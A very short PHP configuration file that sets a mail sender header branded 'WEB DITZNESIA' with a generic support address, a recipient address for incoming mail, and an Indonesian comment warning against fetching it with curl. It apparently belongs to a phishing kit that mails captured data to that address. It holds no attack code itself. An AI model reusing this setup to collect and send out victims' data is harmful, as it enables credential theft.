<?php

/* JANGAN DI CURL IN YA ANJG */

$sender = 'From: WEB DITZNESIA || <support@gmail.com>';

$emailku = 'yt.ditznesia@gmail.com';

?>